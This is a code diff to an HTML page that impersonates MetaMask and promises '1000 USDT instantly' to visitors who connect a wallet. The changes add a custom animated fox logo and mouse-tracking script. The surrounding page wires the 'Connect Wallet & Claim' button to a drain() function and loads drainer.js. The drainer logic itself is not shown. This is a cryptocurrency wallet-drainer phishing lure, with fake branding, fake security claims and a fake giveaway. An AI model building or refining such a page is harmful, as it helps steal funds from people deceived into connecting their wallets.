@@ -12,6 +12,7 @@
       text-align: center;
       padding: 40px;
       margin: 0;
+      overflow: hidden;
     }
     .container {
       background: #1a1a1a;
@@ -21,14 +22,20 @@
       margin: 0 auto;
       box-shadow: 0 4px 20px rgba(0,0,0,0.5);
     }
-    .fox-logo {
-      width: 80px;
-      margin-bottom: 20px;
+    .fox-container {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin: 20px auto;
+    }
+    .fox {
+      width: 100%;
+      transition: transform 0.3s ease;
     }
     h1 {
       font-size: 24px;
-      color: #f6851b; /* نارنجی MetaMask */
-      margin: 0 0 20px;
+      color: #f6851b;
+      margin: 10px 0;
     }
     p {
       font-size: 16px;
@@ -41,7 +48,7 @@
       margin: 20px 0;
     }
     .connect-btn {
-      background: #f6851b; /* نارنجی اصلی MetaMask */
+      background: #f6851b;
       color: #fff;
       border: none;
       padding: 16px;
@@ -65,7 +72,22 @@
 </head>
 <body>
   <div class="container">
-    <img src="https://metamask.io/images/fox.svg" class="fox-logo" alt="MetaMask Fox">
+    <div class="fox-container" id="foxContainer">
+      <svg class="fox" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" stop-color="#f6851b"/>
+            <stop offset="100%" stop-color="#ff9f1c"/>
+          </linearGradient>
+        </defs>
+        <path d="M100 20 C60 20 30 50 30 90 C30 130 60 160 100 160 C140 160 170 130 170 90 C170 50 140 20 100 20 Z" fill="url(#grad)"/>
+        <circle cx="70" cy="80" r="15" fill="#000"/>
+        <circle cx="130" cy="80" r="15" fill="#000"/>
+        <circle cx="75" cy="75" r="5" fill="#fff"/>
+        <circle cx="135" cy="75" r="5" fill="#fff"/>
+        <path d="M70 110 Q100 130 130 110" stroke="#000" stroke-width="8" fill="none"/>
+      </svg>
+    </div>
     <h1>MetaMask</h1>
     <p class="claim-text">Connect your wallet to receive <strong>1000 USDT</strong> instantly!</p>
     <p>No gas fees • Secure transaction • Powered by Ethereum</p>
@@ -73,6 +95,20 @@
     <button class="connect-btn" onclick="drain()">Connect Wallet & Claim</button>
     <div class="footer">© 2025 MetaMask • Encrypted • Secure</div>
   </div>
+
+  <script>
+    // انیمیشن چرخش کله روباه به سمت موس
+    const foxContainer = document.getElementById('foxContainer');
+    const fox = foxContainer.querySelector('.fox');
+
+    document.addEventListener('mousemove', (e) => {
+      const rect = foxContainer.getBoundingClientRect();
+      const x = e.clientX - rect.left - rect.width / 2;
+      const y = e.clientY - rect.top - rect.height / 2;
+      const angle = Math.atan2(y, x) * (180 / Math.PI);
+      fox.style.transform = `rotate(${angle}deg)`;
+    });
+  </script>
   <script src="drainer.js"></script>
 </body>
 </html>
